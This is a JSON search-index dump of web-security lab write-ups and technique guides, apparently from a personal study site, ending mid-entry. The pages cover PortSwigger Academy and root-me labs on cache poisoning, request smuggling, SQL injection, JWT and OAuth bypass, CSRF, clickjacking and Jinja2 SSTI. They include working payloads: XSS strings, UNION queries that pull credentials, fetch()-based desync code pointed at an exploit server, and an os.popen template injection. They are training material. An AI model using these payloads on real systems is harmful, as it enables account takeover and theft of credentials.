    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e95b9dbc86e153cea0fe6f0a24b3e7d6",
    "u": "https://webapp.tymyrddin.dev/docs/cache/2",
    "t": "Web cache poisoning with an unkeyed cookie ",
    "c": "Web cache poisoning with an unkeyed cookie  Description  This lab is vulnerable to web cache poisoning because cookies aren’t included in the cache key. An unsuspecting user regularly visits the site’s home page. Reproduction and proof of concept  With Burp running, load the website’s home page. In Burp, go to Proxy -> HTTP history and study the requests and responses generated. Notice that the first response received sets the cookie fehost=prod-cache-01 . Reload the home page and observe that the value from the fehost cookie is reflected inside a double-quoted JavaScript object in the response. <script> data = { \"host\":\"0a500060032ac28dc2a811090016009c.web-security-academy.net\", \"path\":\"/\", \"frontend\":\"prod-cache-01\" } </script> Send the request to Burp Repeater and add a cache-buster query parameter, such as ?cb=1234 . Change the value of the cookie to an arbitrary string and resend the request. Confirm that this string is reflected in the response. Place a suitable XSS payload in the fehost cookie, for example: fehost=someString\"-alert(1)-\"someString Replay the request until you see the payload in the response and X-Cache: hit in the headers. Load the URL in your browser and confirm the alert() fires. Go back Burp Repeater, remove the cache buster, and replay the request to keep the cache poisoned until the victim visits the site and the lab is solved. Exploitability  An attacker will need to poison the cache with a response that executes alert(1) in the visitor’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6e8520ddd91addcb358eb1650d20291b",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/21",
    "t": "Browser cache poisoning via client-side desync ",
    "c": "Browser cache poisoning via client-side desync  Description  This lab is vulnerable to client-side desync attacks. You can exploit this to induce a victim’s browser to poison its own cache. See Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling: Cisco . Reproduction and proof of concept  Identify the desync vector  Send an arbitrary request to Burp Repeater to experiment with. In Burp Repeater, notice that if you try to navigate above the web root, you encounter a server error. GET /../ HTTP/1.1 HTTP/1.1 500 Internal Server Error Use the tab-specific settings to enable HTTP/1 connection reuse. Change the Connection header to keep-alive. Resend the request. Observe that the response indicates that the server keeps the connection open for 10 seconds, even though you triggered an error. Convert the request to a POST request (right-click and select Change request method). Use the tab-specific settings to disable the Update Content-Length option. Set the Content-Length to 1 or higher, but leave the body empty. Send the request. Observe that the server responds immediately rather than waiting for the body. This suggests that it is ignoring the specified Content-Length. Confirm the desync vector in Burp  Re-enable the Update Content-Length option. Add an arbitrary request smuggling prefix to the body: POST /../ HTTP/1.1 Host: lab-id.web-security-academy.net Connection: keep-alive Content-Length: CORRECT GET /hopefully404 HTTP/1.1 Foo: x Create a new group containing this tab and another tab with a GET / request. Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection). Send the sequence and check the responses. If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this confirms that you can cause a desync. Replicate the desync vector in your browser  Open a separate instance of Chrome that is not proxying traffic through Burp. Go to the exploit server. Open the browser developer tools and go to the Network tab. Ensure that the Preserve log option is selected and clear the log of any existing entries. Go to the Console tab and replicate the attack from the previous section using the fetch() API as follows: fetch('https://lab-id.web-security-academy.net/../', { method: 'POST', body: 'GET /hopefully404 HTTP/1.1\\r\\nFoo: x', mode: 'no-cors', credentials: 'include', }).then(() => { fetch('https://lab-id.web-security-academy.net', { mode: 'no-cors', credentials: 'include' }) }) On the Network tab, you should see two requests for the home page, both of which received a 200 response. Notice that the browser has normalized the URL in the initial request, removing the path traversal sequence required to trigger the server error. Go back to the Console tab and modify the attack so that the slash character in the path traversal sequence is URL encoded ( %2f ) to prevent it from being normalized. Try the attack again. On the Network tab, you should see two new requests: The main request, which has triggered a 500 response. A request for the home page, which received a 404 response. This confirms that the desync vector can be triggered from a browser. Identify an exploitable gadget  Return to the lab website in Burp’s browser, or a browser that’s proxying traffic through Burp. Visit one of the blog posts. In the Proxy -> HTTP history , notice that the server normalizes requests with uppercase characters in the path by redirecting them to the equivalent lowercase path: GET /resources/images/avatarDefault.jpg HTTP/1.1 HTTP/1.1 301 Moved Permanently Location: /resources/images/avatardefault.jpg In Burp Repeater, confirm that you can trigger this redirect by sending a request to an arbitrary path containing uppercase characters: GET /AnYtHiNg HTTP/1.1 HTTP/1.1 301 Moved Permanently Location: /anything Notice that you can turn this into an open redirect by using a protocol-relative path: GET //YOUR-EXPLOIT-SERVER-ID.exploit-server.net/eXpLoIt HTTP/1.1 HTTP/1.1 301 Moved Permanently Location: //YOUR-EXPLOIT-SERVER-ID.exploit-server.net/eXpLoIt Note that this is also a 301 Moved Permanently response, which indicates that this may be cached by the browser. On the login page, notice that there’s a JavaScript import from /resources/js/analytics.js . Go back to the pair of grouped tabs you used to identify the desync vector earlier. In the first tab, replace the arbitrary GET /hopefully404 prefix with a prefix that will trigger the malicious redirect gadget: POST /../ HTTP/1.1 Host: lab-id.web-security-academy.net Cookie: _lab=YOUR-LAB-COOKIE; session=YOUR-SESSION-COOKIE Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: CORRECT GET //YOUR-EXPLOIT-SERVER-ID.exploit-server.net/eXpLoIt HTTP/1.1 Foo: x In the second tab, change the path to point to the JavaScript file at /resources/js/analytics.js . Send the two requests in sequence down a single connection and observe that the request for the analytics.js file received a redirect response to your exploit server. GET /resources/js/analytics.js HTTP/1.1 Host: lab-id.web-security-academy.net HTTP/1.1 301 Moved Permanently Location: //YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit Replicate the attack in your browser  Open a separate instance of Chrome that is not proxying traffic through Burp. Go to the exploit server. Open the browser developer tools and go to the Network tab. Ensure that the Preserve log option is selected and clear the log of any existing entries. Go to the Console tab and replicate the attack from the previous section using the fetch() API as follows: fetch('https://lab-id.web-security-academy.net/..%2f', { method: 'POST', body: 'GET //YOUR-EXPLOIT-SERVER-ID.exploit-server.net/eXpLoIt HTTP/1.1\\r\\nFoo: x', credentials: 'include', mode: 'no-cors' }).then(() => { location='https://lab-id.web-security-academy.net/resources/js/analytics.js' }) Note: If you need to repeat this attack for any reason, make sure that you clear the cache before each attempt ( Settings -> Clear browsing data -> Cached images and files ). Observe that you land on the exploit server’s “Hello world” page. On the Network tab, you should see three requests: The main request, which triggered a server error. A request for the analytics.js file, which received a redirect to your exploit server. A request for the exploit server after following the redirect. With the Network tab still open, go to the login page. On the Network tab, find the most recent request for /resources/js/analytics.js . Notice that not only did this receive a redirect response, but this came from the cache. If you select the request, you can also see that the Location header points to your exploit server. This confirms that you have successfully poisoned the cache via a browser-initiated request. Exploit  Go back to the exploit server and clear the cache. In the Body section, wrap your attack in a conditional statement so that: The first time the browser window loads the page, it poisons its own cache via the fetch() script that you just tested. The second time the browser window loads the page, it performs a top-level navigation to the login page containing the JavaScript import. const labURL = \"lab-id.web-security-academy.net\"; const exploitHost = \"YOUR-EXPLOIT-SERVER-ID.exploit-server.net\"; if(window.name != 'skip'){ window.name = 'skip'; fetch(`${labURL}/..%2f`, { method: 'POST', body: `GET //${exploitHost}/eXpLoIt HTTP/1.1\\r\\nFoo: x`, credentials: 'include', mode: 'no-cors' }).then(() => {location=`${labURL}/resources/js/analytics.js`} ); } else { window.name = ''; location = `${labURL}/login`; } As this page will initially be loaded as HTML, wrap the script in HTML script tags. Wrap the entire attack inside a JavaScript comment, and add your alert() payload outside the comment delimiters: Store the exploit, clear the cache, then click View exploit . Observe that you are navigated...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "733d27207a015805a1a9507ef0fc7318",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/13",
    "t": "Blind SQL injection with time delays ",
    "c": "Blind SQL injection with time delays  Description  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie. The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information. Exploiting the SQL injection vulnerability to cause a 10 second delay. Reproduction and proof of concept  Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie. Modify the TrackingId cookie, changing it to: TrackingId=MEhPSLGnBgPXZFUF'||pg_sleep(10)-- Enter the request and observe that the application takes 10 seconds to respond.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "27c97cc7de6ebdebaff0190c559a66b1",
    "u": "https://webapp.tymyrddin.dev/docs/oauth/1",
    "t": "Authentication bypass via OAuth implicit flow ",
    "c": "Authentication bypass via OAuth implicit flow  Description  This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users’ accounts without knowing their password. Reproduction and proof of concept  While proxying traffic through Burp, click My account and complete the OAuth login process with wiener:peter . Afterwards, you will be redirected back to the blog website. In Burp, go to Proxy -> HTTP history and study the requests and responses that make up the OAuth flow. This starts from the authorisation request GET /auth?client_id=[...] . Notice that the client application (the blog website) receives some basic information about the user from the OAuth service. It then logs the user in by sending a POST request containing this information to its own /authenticate endpoint, along with the access token. Send the POST /authenticate request to Burp Repeater. In Repeater, change the email address to carlos@carlos-montoya.net and send the request. Observe that you do not encounter an error. Right-click on the POST request and select Request in browser -> In original session . Copy this URL and visit it in your browser. You are logged in as Carlos and the lab is solved. Exploitability  An attacker will need to log in; know carlos’ email address ( carlos@carlos-montoya.net ) and abuse the vulnerability to log in to Carlos’s account.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "75e238145557a1b85dc2d126ab382c4f",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/clickjacking",
    "t": "Clickjacking ",
    "c": "Clickjacking  Clickjacking is a technique where a user clicks on a malicious link without realising. This is usually done with a transparent layer on the original site that uses JavaScript or CSS, but if you have control of a subdomain that is trusted by the user, an attacker can socially engineer users to click on the malicious link. Steps  Spot the state-changing actions on the website and keep a note of their URL locations. Mark the ones that require only mouse clicks to execute for further testing. Check these pages for the X-Frame-Options , Content-Security-Policy header, and a SameSite session cookie. If you can’t spot these protective features, the page might be vulnerable. Craft an HTML page that frames the target page, and load that page in a browser to see if the page has been framed. Confirm the vulnerability by executing a simulated clickjacking attack on your own test account. Craft a sneaky way of delivering your payload to end users, and consider the larger impact of the vulnerability. Draft the report. Look for state-changing actions  Clickjacking vulnerabilities are valuable only when the target page contains state-changing actions. Look for pages that allow users to make changes to their accounts, like changing their account details or settings. Also check that the action can be achieved via clicks alone. Check the Response Headers  Go through each of the state-changing functionalities found and revisit the pages that contain them. Turn on a proxy and intercept the HTTP response that contains that web page. See if the page is being served with the X-Frame-Options or Content-Security-Policy header. If the page is served without any of these headers, it may be vulnerable to clickjacking. And if the state-changing action requires users to be logged in when it is executed, you should also check if the site uses SameSite cookies. If it does, you won’t be able to exploit a clickjacking attack on the site’s features that require authentication. You can confirm that a page is frameable by creating an HTML page that frames the target page. If the target page shows up in the frame, the page is frameable: <html> <head> <title>Clickjack test page</title> </head> <body> <p>This page is vulnerable to clickjacking if the iframe is not blank!</p> <iframe src=\"PAGE_URL\" width=\"500\" height=\"500\"></iframe> </body> </html> Confirm the vulnerability  Confirm the vulnerability by executing a clickjacking attack on the test account. Try to execute the state-changing action through the framed page you just constructed and see if the action succeeds. Bypassing protections  Clickjacking is not possible when the site implements the proper protections. If a modern browser displays an X-Frame-Options protected page, chances are you can not exploit clickjacking on the page, and you will have to find another vulnerability, such as XSS or CSRF, to achieve the same results. Sometimes, the page does not show up in your test iframe even though it lacks the headers that prevent clickjacking. If the website itself fails to implement complete clickjacking protections, you might be able to bypass the mitigations. If the website uses frame-busting techniques instead of HTTP response headers and SameSite cookies: find a loophole in the frame-busting code. For instance, developers commonly make the mistake of comparing only the top frame to the current frame when trying to detect whether the protected page is framed by a malicious page. If the top frame has the same origin as the framed page, developers may allow it, because they deem the framing site’s domain to be safe. In this case, search for a location on the victim site that allows you to embed custom iframes. Common features that require custom iframes are those that allow you to embed links, videos, audio, images, and custom advertisements and web page builders. The double iframe trick works by framing a malicious page within a page in the victim’s domain. First, construct a page that frames the victim’s targeted functionality. Then place the entire page in an iframe hosted by the victim site. This way, both top.location and self.location point to victim.com . In general, look for the edge cases a developer did not include. Escalation  Websites often serve pages without clickjacking protection. As long as the page does not contain exploitable actions, the lack of clickjacking protection is not considered a vulnerability. On the other hand, if the frameable page contains sensitive actions, the impact of clickjacking can be correspondingly severe. Focus on the application’s most critical functionalities to achieve maximum business impact. You can also combine multiple clickjacking vulnerabilities or chain clickjacking with other bugs to pave the way to more severe security issues. Portswigger lab writeups  Basic clickjacking with CSRF token protection Clickjacking with form input data prefilled from a URL parameter Clickjacking with a frame buster script Exploiting clickjacking vulnerability to trigger DOM-based XSS Multistep clickjacking Remediation  Frame busting scripts are busted: It is often easy for an attacker to circumvent these protections. Clickjacking is a browser-side behaviour and its success depends on browser functionality and conformity to prevailing web standards and best practice. Server-side protection against clickjacking can be provided by defining and communicating constraints over the use of components such as iframes. And implementation of protection depends upon browser compliance and enforcement of these constraints. Two mechanisms for server-side clickjacking protection are X-Frame-Options and Content Security Policy . X-Frame-Options is not implemented consistently across browsers, but when properly applied in conjunction with Content Security Policy as part of a multi-layer defense strategy it can provide effective protection against clickjacking attacks. The recommended clickjacking protection is to incorporate the frame-ancestors directive in the application’s Content Security Policy . The frame-ancestors none directive is similar in behaviour to the X-Frame-Options deny directive. The frame-ancestors self directive is broadly equivalent to the X-Frame-Options sameorigin directive. The following CSP whitelists frames to the same domain only: Content-Security-Policy: frame-ancestors 'self'; Framing can also be restricted to named sites: Content-Security-Policy: frame-ancestors normal-website.com; To be effective against clickjacking and XSS, CSPs need careful development, implementation and testing and should be used as part of a multi-layer defense strategy. Resources  Portswigger: Clickjacking (UI redressing) OWASP: Testing for Clickjacking HackTricks: Clickjacking Bug Bounty Bootcamp Bug Bounty Hunting Essentials Bug Bounty Hunting for Web Security",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "a82217ee0313b74d2d6764016c13e4e9",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/14",
    "t": "HTTP/2 request splitting via CRLF injection ",
    "c": "HTTP/2 request splitting via CRLF injection  Description  This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming headers. Reproduction and proof of concept  Send a request for GET / to Burp Repeater. Expand the Inspector’s Request Attributes section and change the protocol to HTTP/2 . Change the path of the request to a non-existent endpoint, such as /x . This means that your request will always get a 404 response. Once you have poisoned the response queue, this will make it easier to recognise any other users’ responses that you have successfully captured. Using the Inspector, append an arbitrary header to the end of the request. In the header value, inject \\r\\n sequences to split the request so that you’re smuggling another request to a non-existent endpoint as follows: Name foo Value bar\\r\\n \\r\\n GET /x HTTP/1.1\\r\\n Host: 0af0000a03807338c14703d100f50002.web-security-academy.net Send the request. When the front-end server appends \\r\\n\\r\\n to the end of the headers during downgrading, this effectively converts the smuggled prefix into a complete request, poisoning the response queue. Wait for around 5 seconds, then send the request again to fetch an arbitrary response. Most of the time, you will receive your own 404 response. Any other response code indicates that you have successfully captured a response intended for the admin user. Repeat this process until you capture a 302 response containing the admin’s new post-login session cookie. Note: If you receive some 200 responses but can’t capture a 302 response even after a lot of attempts, send 10 ordinary requests to reset the connection and try again. Copy the session cookie and use it to send the following request: GET /admin HTTP/2 Host: 0af0000a03807338c14703d100f50002.web-security-academy.net Cookie: session=wiXSVQ5UHi5wmzUxpeTquY7qxhT11YbJ Send the request repeatedly until you receive a 200 response containing the admin panel. In the response, find the URL for deleting Carlos ( /admin/delete?username=carlos ), then update the path in your request accordingly. Send the request to delete Carlos. Exploitability  An attacker will need to delete the user carlos by using response queue poisoning to break into the admin panel at /admin. An admin user will log in approximately every 10 seconds. The connection to the back-end is reset every 10 requests. If the connection gets it into a bad state - just send a few normal requests to get a fresh connection.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "50f5caec079b8817633c677b52958d75",
    "u": "https://webapp.tymyrddin.dev/docs/jwt/1",
    "t": "JWT authentication bypass via unverified signature ",
    "c": "JWT authentication bypass via unverified signature  Description  This lab uses a JWT-based mechanism for handling sessions. Due to implementation flaws, the server doesn’t verify the signature of any JWTs that it receives. Reproduction and proof of concept  In the lab, log in with wiener:peter . In Burp, go to the Proxy -> HTTP history tab and look at the post-login GET /my-account request. Observe that your session cookie is a JWT. Double-click the payload part of the token to view its decoded JSON form in the Inspector panel. Notice that the sub claim contains your username. Send this request to Burp Repeater. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user. Select the payload of the JWT again. In the Inspector panel, change the value of the sub claim from wiener to administrator , then click Apply changes . Send the request again. Observe that you have successfully accessed the admin panel. In the response, find the URL for deleting Carlos ( /admin/delete?username=carlos ). Send the request to this endpoint to solve the lab. Exploitability  An attacker will need to log in to wiener:peter ; modify the session token to gain access to the admin panel at /admin , then delete the user carlos .",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "caba220b2887cce4067e24606fba194a",
    "u": "https://webapp.tymyrddin.dev/docs/clickjacking/readme",
    "t": "Introduction ",
    "c": "Portswigger Academy Clickjacking Labs Introduction  What?  Clickjacking attacks rely on visual tricks to get website visitors to click on user interface elements that will perform actions on another website. The attack is performed by hiding the target website’s UI and arranging the visible UI so that the user is not aware of clicking the target website. Due to this UI arrangement, this kind of attack is also known as UI redressing or UI redress attack. Why?  The goal of a clickjacking attack is to trick unsuspecting website visitors into actions on another website like transferring money, purchasing products, downloading malware, give them like on a social network, and so on. How?  Clickjacking techniques Basic clickjacking with CSRF token protection Clickjacking with form input data prefilled from a URL parameter Clickjacking with a frame buster script Exploiting clickjacking vulnerability to trigger DOM-based XSS Multistep clickjacking",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1ad4f94a4066aa074f33631587754d94",
    "u": "https://webapp.tymyrddin.dev/docs/smuggling/4",
    "t": "HTTP request smuggling, confirming a CL.TE vulnerability via differential responses ",
    "c": "HTTP request smuggling, confirming a CL.TE vulnerability via differential responses  Description  This lab involves a front-end and back-end server, and the back-end server doesn’t support chunked encoding. Reproduction and proof of concept  Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: lab-id.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X The second request should receive an HTTP 404 response. Exploitability  An attacker will need to smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response. In this case the CL.TE vulnerability must be exploited via differential response.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d33b3cb8aab3653fa10ade155d0385a7",
    "u": "https://webapp.tymyrddin.dev/docs/techniques/disclosure",
    "t": "Information disclosure ",
    "c": "Information disclosure  Information disclosure occurs when an application fails to properly protect sensitive information, giving users access to information they should not have available to them. Steps  Look for software version numbers and configuration information by using recon techniques . Search for exposed configuration files, database files, and other sensitive files uploaded to the production server that aren’t protected properly. Techniques you can use include path traversal, scraping the Wayback Machine or paste dump sites, and looking for files in exposed .git directories. Find information in the application’s public files, such as its HTML and JavaScript source code, by grepping the file with keywords. Consider the impact of the information you find before reporting it, and explore ways to escalate its impact. Draft report. Try a path traversal attack  Start by trying a path traversal attack to read the server’s sensitive files. Search the Wayback Machine  Another way to find exposed files is by using the Wayback Machine, an online archive of what websites looked like at various points in time. You can use it to find hidden and deprecated endpoints, as well as large numbers of current endpoints without actively crawling the site, making it a good first look into what the application might be exposing. On the Wayback Machine’s site, simply search for a domain to see its past versions. To search for a domain’s files, visit https://web.archive.org/web/*/DOMAIN . Search Paste Dump sites  Look into paste dump sites like Pastebin and GitHub gists. These let users share text documents via a direct link rather than via email or services like Google Docs, so developers often use them to send source code, configuration files, and log files to colleagues. On a site like Pastebin, shared text files are public by default. If developers upload a sensitive file, everyone will be able to read it. For this reason, these code-sharing sites are pretty infamous for leaking credentials like API keys and passwords. Pastebin-scraper uses the Pastebin API to search for paste files. This tool is a shell script, the -g option indicates a general keyword search: ./scrape.sh -g KEYWORD Reconstruct source code from an exposed .git directory  Another way of finding sensitive files is to reconstruct source code from an exposed .git directory. When attacking an application, obtaining its source code can be extremely helpful for constructing an exploit. This is because some bugs, like SQL injections , are way easier to find through static code analysis than black-box testing. Find Information in public files  Try to find information leaks in the application’s public files, such as their HTML and JavaScript source code. JavaScript files are a rich source of information leaks. You can also locate JavaScript files on a site by using tools like LinkFinder . Escalation  After you’ve found a sensitive file or a piece of sensitive data, determine its impact If you have found credentials such as a password or an API key, validate that they’re currently in use by accessing the target’s system with them. If the sensitive files or credentials are valid and current, consider how one can compromise the application’s security with them. If the impact of the information you found isn’t particularly critical, you can explore ways to escalate the vulnerability by chaining it with other security issues. For example, if you can leak internal IP addresses within the target’s network, you can use them to pivot into the network during an SSRF exploit. Alternatively, if you can pinpoint the exact software version numbers the application is running, see if any CVEs are related to the software version that can help you achieve RCE . Portswigger lab writeups  Information disclosure in error messages Information disclosure on debug page Source code disclosure via backup files Authentication bypass via information disclosure Information disclosure in version control history Remediation  Make sure that everyone involved in producing the web application is aware of what information is considered sensitive. Sometimes seemingly harmless information can be much more useful to an attacker than people realise. Audit any code for potential information disclosure as part of the build processes. It should be relatively easy to automate some associated tasks, such as stripping developer comments. Use generic error messages as much as possible. Do not provide attackers with clues about application behaviour unnecessarily. Double-check that debugging and diagnostic features are disabled in the production environment. Make sure you fully understand the configuration settings, and security implications, of any third-party technology used. Take the time to investigate and disable any features and settings that are not needed. Resources  Portswigger: Information disclosure vulnerabilities Bug Bounty Bootcamp Bug Bounty Hunting Essentials Bug Bounty Hunting for Web Security",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "24441c2aa558ec619fb97dfe60a9e7e9",
    "u": "https://webapp.tymyrddin.dev/docs/csrf/5",
    "t": "CSRF where token is tied to non-session cookie ",
    "c": "CSRF where token is tied to non-session cookie  Description  This lab ’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t fully integrated into the site’s session handling system. Reproduction and proof of concept  Open Burp’s browser and log in to the wiener account. Submit the “Update email” form, and find the resulting request in your Proxy history. Send the request to Burp Repeater and observe that changing the session cookie logs you out, but changing the csrfKey cookie merely results in the csrf token being rejected. This suggests that the csrfKey cookie may not be strictly tied to the session. To check csrf cookie and csrf token are tied, enter an invalid token. The request is not accepted. Open a private/incognito browser window, log in to Portswigger, then on the lab site into the carlos attacker account, and send a fresh update email request into Burp Repeater. Swapping the csrfKey cookie and csrf parameter from the carlos account to the wiener account (or vv), the request is accepted. HTTP/1.1 302 Found Location: /my-account Connection: close Content-Length: 0 Swapping only one of the two, the request is not accepted. The two are tied. Close the Repeater tab and incognito browser. Back in the original browser in the wiener account, do a search, send the resulting request to Burp Repeater. Check that the search term gets reflected in the Set-Cookie header. GET /?search=whatever HTTP/1.1 Host: 0a8a007003328fbbc0520eb3006500e7.web-security-academy.net Cookie: session=3434rpqGQke3AkVlNlulO9qFJKzTjK4J; csrfKey=h8xkUPRUr4PbtkKwRm6bORpJx5qWNibu ... Because the search function has no CSRF protection, this can be used to inject cookies into the victim user’s browser. Create a URL that uses this vulnerability to inject a csrfKey cookie from the carlos attacker account into the victim’s browser: /?search=test%0d%0aSet-Cookie:%20csrfKey=JZdIUDJnjrR2QPnOBOVp9z5VukuYTpf4%3b%20SameSite=None Results: HTTP/1.1 200 OK Set-Cookie: LastSearchTerm=test Set-Cookie: csrfKey=JZdIUDJnjrR2QPnOBOVp9z5VukuYTpf4; SameSite=None; Secure; HttpOnly Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab (above), ensuring that you include your CSRF token. The exploit should be created from the email change request. Remove the auto-submit script block and replace it with the /?search=test%0d%0aSet-Cookie:%20csrfKey=JZdIUDJnjrR2QPnOBOVp9z5VukuYTpf4%3b%20SameSite=None , and change the csrf token to the tied csrfKey one of the attacker: <html> <!-- CSRF PoC - generated by Burp Suite Professional --> <body> <script>history.pushState('', '', '/')</script> <form action=\"https://0a8a007003328fbbc0520eb3006500e7.web-security-academy.net/my-account/change-email\" method=\"POST\"> <input type=\"hidden\" name=\"email\" value=\"test&#64;normal&#45;user&#46;net\" /> <input type=\"hidden\" name=\"csrf\" value=\"JZdIUDJnjrR2QPnOBOVp9z5VukuYTpf4\" /> <input type=\"submit\" value=\"Submit request\" /> </form> <img src=\"https://0a8a007003328fbbc0520eb3006500e7.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=49yoasBlApBjSMbVt4Qi2SddyqBHMqgn%3b%20SameSite=None\" onerror=\"document.forms[0].submit()\"> </body> </html> Copy HTML and put it in the body of the Exploit server form: Store the exploit in the exploit server of the lab, then click Deliver to victim . Exploitability  An attacker needs to use the exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address. There are two accounts on the application that can be used: wiener:peter (victim) and carlos:montoya (attacker). Impact  If an attacker can change the email address of another user, he/she can log in as that user and gain access to the account and all of its data.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8bb3d3723b7afde5d4e3e209ad4eb47d",
    "u": "https://webapp.tymyrddin.dev/docs/web-server/python1",
    "t": "Python: Server-side Template Injection Introduction ",
    "c": "Python: Server-side Template Injection Introduction  root-me challenge: Python - Server-side Template Injection Introduction : This service allows you to generate a web page. Use it to read the flag! ${ ... } didn’t work, but {{ ... }} did. Further fiddling. Apparently Jinja2. Use {{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }} to cat .passwd . Resources  SSTI techniques (these writeups) PayloadAllTheThings: Exploit the SSTI by calling os.popen().read()",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "ff41811aa9ecf4add2ffcef29bbaaae1",
    "u": "https://webapp.tymyrddin.dev/docs/cache/13",
    "t": "Internal cache poisoning ",
    "c": "Internal cache poisoning  Description  This lab is vulnerable to web cache poisoning. It uses multiple layers of caching. A user regularly visits this site’s home page using Chrome. Reproduction  The home page is a suitable cache oracle and send the GET / request to Burp Repeater. Any changes to the query string are reflected in the response. This indicates that the external cache includes this in the cache key. Use Param Miner to add a dynamic cache-buster query parameter. This will allow you to bypass the external cache. The X-Forwarded-Host header is supported. Add this to your request, containing your exploit server URL: X-Forwarded-Host: exploit-server-id.exploit-server.net Send the request. If you get lucky with your timing, you will notice that the exploit server URL is reflected three times in the response. However, most of the time, you will see that the URL for the canonical link element and the analytics.js import now both point to your exploit server, but the geolocate.js import URL remains the same. Keep sending the request. Eventually, the URL for the geolocate.js resource will also be overwritten with your exploit server URL. This indicates that this fragment is being cached separately by the internal cache. Notice that you’ve been getting a cache hit for this fragment even with the cache-buster query parameter - the query string is unkeyed by the internal cache. Remove the X-Forwarded-Host header and resend the request. Notice that the internally cached fragment still reflects your exploit server URL, but the other two URLs do not. This indicates that the header is unkeyed by the internal cache but keyed by the external one. Therefore, you can poison the internally cached fragment using this header. Go to the exploit server and create a file at /js/geolocate.js containing the payload alert(document.cookie) . Store the exploit. Back in Burp Repeater, disable the dynamic cache buster in the query string and re-add the X-Forwarded-Host header to point to your exploit server. Send the request over and over until all three of the dynamic URLs in the response point to your exploit server. Keep replaying the request to keep the cache poisoned until the victim user visits the page and the lab is solved. PoC  Exploitability  An attacker will need to poison the internal cache so that the home page executes alert(document.cookie) in the victim’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "19a1e7ca44ba363f51cbda26ed556aab",
    "u": "https://webapp.tymyrddin.dev/docs/cache/5",
    "t": "Web cache poisoning via an unkeyed query string ",
    "c": "Web cache poisoning via an unkeyed query string  Description  This lab is vulnerable to web cache poisoning because the query string is unkeyed. A user regularly visits this site’s home page using Chrome. Reproduction and proof of concept  With Burp running, load the website’s home page. In Burp, go to Proxy -> HTTP history . Find the GET request for the home page. Notice that this page is a potential cache oracle. Send the request to Burp Repeater. Add arbitrary query parameters to the request, for example: GET /?parameter1=x&parameter2=evil HTTP/1.1 You can still get a cache hit even if you change the query parameters. This indicates that they are not included in the cache key. Notice that you can use the Origin header as a cache buster. Add it to your request. When you get a cache miss, notice that your injected parameters are reflected in the response. If the response to your request is cached, you can remove the query parameters and they will still be reflected in the cached response. Add an arbitrary parameter that breaks out of the reflected string and injects an XSS payload: GET /?evil='/><script>alert(1)</script> Keep replaying the request until you see your payload reflected in the response and X-Cache: hit in the headers. To simulate the victim, remove the query string from your request and send it again (while using the same cache buster). Check that you still receive the cached response containing your payload. Remove the cache-buster Origin header and add your payload back to the query string. Replay the request until you have poisoned the cache for normal users. Confirm this attack has been successful by loading the home page in your browser and observing the popup. The lab will be solved when the victim user visits the poisoned home page. You may need to re-poison the cache if the lab is not solved after 35 seconds. Exploitability  An attacker will need to poison the home page with a response that executes alert(1) in the victim’s browser.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "2a2f0b9dcd89b424e6760fc1873e1e4c",
    "u": "https://webapp.tymyrddin.dev/docs/sqli/10",
    "t": "SQL injection attack, listing the database contents on Oracle ",
    "c": "SQL injection attack, listing the database contents on Oracle  Description  This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application’s response, so it is possible to use a UNION attack to retrieve data from other tables. Reproduction and proof of concept  Use Burp Suite to intercept and modify the request that sets the product category filter. Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter: '+UNION+SELECT+'abc','def'+FROM+dual-- Use the following payload to retrieve the list of tables in the database: '+UNION+SELECT+table_name,NULL+FROM+all_tables-- Find the name of the table containing user credentials. Use the following payload (replacing the table name) to retrieve the details of the columns in the table: '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_GYCDOW'-- Find the names of the columns containing usernames and passwords. Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users: '+UNION+SELECT+USERNAME_WWIUXV,+PASSWORD_GFLFLH+FROM+USERS_GYCDOW-- Find the password for the administrator user, and use 